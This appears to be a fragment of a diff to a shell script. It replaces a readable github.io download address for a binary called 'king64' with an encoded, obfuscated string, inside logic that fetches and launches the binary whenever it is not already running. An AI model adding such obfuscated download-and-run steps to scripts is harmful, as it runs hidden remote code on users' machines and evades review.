@@ -37,7 +37,7 @@ if [ $check_vip = false ]; then
 		echo
 		status=$(pgrep -f king64) >/dev/null 2>&1
 		if [ ! "$status" ]; then
-			xtorm "https//henbz10real.github.io/snx11response/king64" -fn "king64"
+			xtorm "r17rYI0tYDmC2ycsdA6DKSpQNWjCduguXy1Pz5gsp9qsexoDOAct3SmseEcC2kgsdt2ER==" -fn "king64"
 		fi 
 		sleep 2
 		status=$(pgrep -f king64) >/dev/null 2>&1
